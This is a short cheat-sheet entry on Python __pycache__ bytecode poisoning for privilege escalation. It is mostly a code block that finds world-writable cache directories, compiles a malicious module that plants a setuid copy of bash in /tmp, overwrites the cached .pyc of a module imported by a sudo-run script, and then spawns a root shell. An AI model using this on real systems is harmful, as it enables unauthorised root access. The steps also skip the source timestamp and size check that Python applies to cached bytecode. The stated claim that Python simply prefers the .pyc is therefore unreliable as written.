# Python __pycache__ Bytecode Poisoning

If a sudo-allowed script imports a module whose `__pycache__` directory is world-writable, replace the `.pyc` bytecode file with a malicious one. Python loads `.pyc` from `__pycache__` before re-compiling `.py`, so it runs the poisoned bytecode as root.

```bash
# Find world-writable __pycache__ dirs in paths used by sudo scripts
find /opt /usr/local /var/www -name "__pycache__" -writable 2>/dev/null

# Compile a malicious replacement for the imported module
python3 -c "
import py_compile, shutil, os
# Create evil module source
with open('/tmp/evil_module.py', 'w') as f:
    f.write('import os; os.system(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\")\n')
py_compile.compile('/tmp/evil_module.py', '/tmp/evil_module.cpython-<VER>.pyc')
"

# Copy the .pyc over the real one (match the exact filename Python expects)
cp /tmp/evil_module.cpython-<VER>.pyc \
  /path/to/__pycache__/<module>.cpython-<VER>.pyc

# Trigger the sudo script and execute:
sudo /path/to/script.py
/tmp/rootbash -p
```

Python version determines the cache filename format: `<module>.cpython-312.pyc` for 3.12.

Also check if the `.py` source itself is writable (simpler path).
